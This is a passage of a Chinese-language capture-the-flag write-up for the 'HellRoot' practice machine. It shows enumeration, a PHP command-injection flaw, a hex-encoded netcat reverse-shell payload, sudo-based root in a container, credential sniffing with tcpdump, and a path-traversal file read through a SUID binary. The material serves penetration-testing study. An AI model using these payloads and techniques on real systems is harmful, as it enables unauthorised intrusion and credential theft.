 Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.76 ms 192.168.56.95\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫描出来有两个 \u003ccode\u003eSSH\u003c/code\u003e 服务，三个 \u003ccode\u003eWeb\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e192.168.56.5\u003c/code\u003e 是 \u003ccode\u003eApache\u003c/code\u003e 的默认页面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehttps://git.hellroot.thl/\u003c/code\u003e 是 \u003ccode\u003eGitea\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehttp://git.hellroot.thl:5000/\u003c/code\u003e 是域名解析一样的东西\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试了一下这个功能，貌似是使用 \u003ccode\u003edig\u003c/code\u003e 来做域名解析，不过我这里使用仅主机所以无法进行解析\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里我也尝试了命令拼接，经过简单尝试没有哪里可以进行注入\u003c/p\u003e\n\u003cp\u003e来到 \u003ccode\u003egitea\u003c/code\u003e 能找到一个项目\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将压缩包下载下来打开，是 \u003ccode\u003e5000\u003c/code\u003e 端口的源码\u003c/p\u003e\n\u003cp\u003e有三个文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003eDockerfile\u003c/code\u003e 里面能发现一个用户密码，但是这里使用 \u003ccode\u003eSSH\u003c/code\u003e 无法进行登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# Create user astro with passwordless sudo access only for /bin/su\u003c/span\u003e\nRUN useradd -m astro \u0026#x26;\u0026#x26; \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"astro:iloveastro\"\u003c/span\u003e | chpasswd \u0026#x26;\u0026#x26; \\\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"astro ALL=(ALL:ALL) NOPASSWD: /bin/su\"\u003c/span\u003e \u003e /etc/sudoers.d/astro-su \u0026#x26;\u0026#x26; \\\n    \u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e 440 /etc/sudoers.d/astro-su\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e并且 \u003ccode\u003e222\u003c/code\u003e 端口只能使用私钥进行登录\u003c/p\u003e\n\u003ch2\u003eRCE 漏洞\u003c/h2\u003e\n\u003cp\u003e下边是\u003ccode\u003eindex.php\u003c/code\u003e 的源码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;main\u003e\n  \u0026#x3C;h1\u003eDomain Lookup Service\u0026#x3C;/h1\u003e\n  \u0026#x3C;form method=\u003cspan class=\"hljs-string\"\u003e\"POST\"\u003c/span\u003e action=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003e\n    \u0026#x3C;label \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"domain\"\u003c/span\u003e\u003eEnter Domain\u0026#x3C;/label\u003e\n    \u0026#x3C;input \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"domain\"\u003c/span\u003e name=\u003cspan class=\"hljs-string\"\u003e\"domain\"\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text\"\u003c/span\u003e placeholder=\u003cspan class=\"hljs-string\"\u003e\"example.com\"\u003c/span\u003e required autocomplete=\u003cspan class=\"hljs-string\"\u003e\"off\"\u003c/span\u003e /\u003e\n    \u0026#x3C;button \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"submit\"\u003c/span\u003e\u003eLookup DNS\u0026#x3C;/button\u003e\n  \u0026#x3C;/form\u003e\n\n\u0026#x3C;?php\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$_SERVER\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'REQUEST_METHOD'\u003c/span\u003e] === \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e \u0026#x26;\u0026#x26; !empty(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'domain'\u003c/span\u003e])) {\n    \u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e = trim(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'domain'\u003c/span\u003e]);\n    \u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e = @hex2bin(\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e);\n\n    // Always show raw output \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e debugging\n    ob_start();\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e \u0026#x26;\u0026#x26; ctype_print(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e)) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (strpos(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e';'\u003c/span\u003e) !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {\n            // Remove header modification that breaks execution\n            \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e . \u003cspan class=\"hljs-string\"\u003e' 2\u003e\u0026#x26;1'\u003c/span\u003e);\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e = escapeshellarg(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e);\n            \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-string\"\u003e\"nslookup \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e 2\u003e\u0026#x26;1\"\u003c/span\u003e);\n        }\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e = escapeshellarg(\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e);\n        \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-string\"\u003e\"nslookup \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e 2\u003e\u0026#x26;1\"\u003c/span\u003e);\n    }\n\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'\u0026#x3C;pre class=\"result\"\u003e'\u003c/span\u003e . htmlspecialchars(\u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e ?: \u003cspan class=\"hljs-string\"\u003e'No output returned.'\u003c/span\u003e) . \u003cspan class=\"hljs-string\"\u003e'\u0026#x3C;/pre\u003e'\u003c/span\u003e;\n    ob_end_flush();\n}\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e很明显存在一个\u003ccode\u003eRCE\u003c/code\u003e 漏洞\u003c/p\u003e\n\u003cp\u003e这里接收我们的参数 \u003ccode\u003edomain\u003c/code\u003e ，然后对其进行\u003ccode\u003e16\u003c/code\u003e进制编码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e = trim(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'domain'\u003c/span\u003e]);\n\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e = @hex2bin(\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后下边判断解码是否成功，和是否为可以打印字符\u003c/p\u003e\n\u003cp\u003e假如我们直接输入字符则进入 \u003ccode\u003eelse\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e   \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e \u0026#x26;\u0026#x26; ctype_print(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e)) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (strpos(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e';'\u003c/span\u003e) !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {\n            // Remove header modification that breaks execution\n            \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e . \u003cspan class=\"hljs-string\"\u003e' 2\u003e\u0026#x26;1'\u003c/span\u003e);\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e = escapeshellarg(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e);\n            \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-string\"\u003e\"nslookup \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e 2\u003e\u0026#x26;1\"\u003c/span\u003e);\n        }\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n\t\t    // 字符直接进入这里\n        \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e = escapeshellarg(\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e);\n        \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-string\"\u003e\"nslookup \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e 2\u003e\u0026#x26;1\"\u003c/span\u003e);\n    }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e假如我们输入\u003ccode\u003e16\u003c/code\u003e进制，并且解码成功就会进入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (strpos(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e';'\u003c/span\u003e) !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {\n            // Remove header modification that breaks execution\n            \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e . \u003cspan class=\"hljs-string\"\u003e' 2\u003e\u0026#x26;1'\u003c/span\u003e);\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e = escapeshellarg(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e);\n            \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-string\"\u003e\"nslookup \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e 2\u003e\u0026#x26;1\"\u003c/span\u003e);\n        }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e$output = shell_exec($decoded . ' 2\u003e\u0026#x26;1');\u003c/code\u003e ，如果找到了分号，代码会直接将解码后的、未经任何处理的字符串 \u003ccode\u003e$decoded\u003c/code\u003e 传递给 \u003ccode\u003eshell_exec\u003c/code\u003e 函数执行\u003c/p\u003e\n\u003cp\u003e我们尝试 \u003ccode\u003egoogle.com;nc 192.168.56.5 80\u003c/code\u003e ，然后转换为 \u003ccode\u003e16\u003c/code\u003e 进制\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e参数填入 \u003ccode\u003edomian\u003c/code\u003e 参数后成功执行\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003egoogle.com;nc 192.168.56.5 1234 -e /bin/bash\n// To hex\n676f6f676c652e636f6d3b6e63203139322e3136382e35362e352031323334202d65202f62696e2f62617368\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e网络嗅探\u003c/h2\u003e\n\u003cp\u003e当前我们在 \u003ccode\u003eDocker\u003c/code\u003e 环境里面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@05cc10128c04:/home$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -la /\ntotal 64\ndrwxr-xr-x   1 root root 4096 Jul 19 12:49 .\ndrwxr-xr-x   1 root root 4096 Jul 19 12:49 ..\n-rwxr-xr-x   1 root root    0 Jul 19 12:49 .dockerenv\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e找到一个文本文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@05cc10128c04:/var/www/html$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e sniff.txt \nPuede que haya ciertas herramientas que te permitan esnifar el trafico.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e可能存在某些工具可以让你嗅探流量。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e隐藏的 \u003ccode\u003e.config\u003c/code\u003e 文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@05cc10128c04:/var/www/html/.config$\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e里面有 \u003ccode\u003edpkg\u003c/code\u003e 的信息，能看到有 \u003ccode\u003etcpdump\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用上面的得到的凭据切换用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@05cc10128c04:/home$ su astro \nPassword: \n$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1001(astro) gid=1001(astro) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1001(astro)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再根据 \u003ccode\u003esudo -l\u003c/code\u003e 的权限，可以直接切换到 \u003ccode\u003eroot\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e astro on 05cc10128c04:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser astro may run the following commands on 05cc10128c04:\n    (ALL : ALL) NOPASSWD: /bin/su\n$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e su root\nroot@05cc10128c04:/home# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们再根据上边的文件进行网络嗅探\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是直接抓并不能抓到什么有用的，想起来 \u003ccode\u003eGitea\u003c/code\u003e 可以进行登录\u003c/p\u003e\n\u003cp\u003e先提前开启抓包，然后在网站上个使用凭据登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003etcpdump -i eth0 -A -w 1.pcap\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后直接查看数据包，能得到一个凭据\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但一开始并没想到这个是密码，因为我认为这是前端传过来加密数据\u003c/p\u003e\n\u003cp\u003e然后在 \u003ccode\u003essh\u003c/code\u003e 进行密码碰撞，成功登录进去了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e能读取到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003cp\u003e寻找存在 \u003ccode\u003esuid\u003c/code\u003e 权限的程序\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003eastro@hellroot:~$ find / -perm -u=s -type f 2\u003e/dev/null\n/usr/local/bin/secmonitor\n/usr/local/bin/logview\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e有两个奇怪的程序 \u003ccode\u003elogview\u003c/code\u003e 和 \u003ccode\u003esecmonitor\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003elogview\u003c/code\u003e 能直接读文件，直接读 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003eastro@hellroot:~$ logview ../../root/root.txt\n[logview] Running with administrative privileges\nDisplaying log: /var/log/../../root/root.txt\nf03xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e","title":"TheHackersLabs - HellRoot","date":"2025-08-02","updated":"2025-08-02","tags":["TheHackersLabs","Linux","RCE","Logview"],"categories":"靶机","comments":true,"description":"HellRoot https://labs.thehackerslabs.com/machine/121 Recon PortScan 扫描出来有两个 SSH 服务，三个 Web 枚举 192.168.56.5 是 Apache 的默认页面 https://git.hellroot.thl/ 是 G..."},"recentPosts":[{"id":"群U靶机SudoHome_sunset","title":"群U靶机 - SudoHome","date":"2025-11-23","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"群U靶机Yibasuo","title":"群U靶机 - Yibasuo","date":"2025-11-22","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"HackMyVMHunter","title":"HackMyVM - Hunter","date":"2025-11-21","isEncrypted":false,"year":"2025","month":"11","day":"21"},{"id":"HackTheBoxSeason9 - NanoCorp","title":"HackTheBox - Season9 - NanoCorp","date":"2025-11-14","isEncrypted":true,"year":"2025","month":"11","day":"14"},{"id":"HackTheBoxSeason8 - Vo
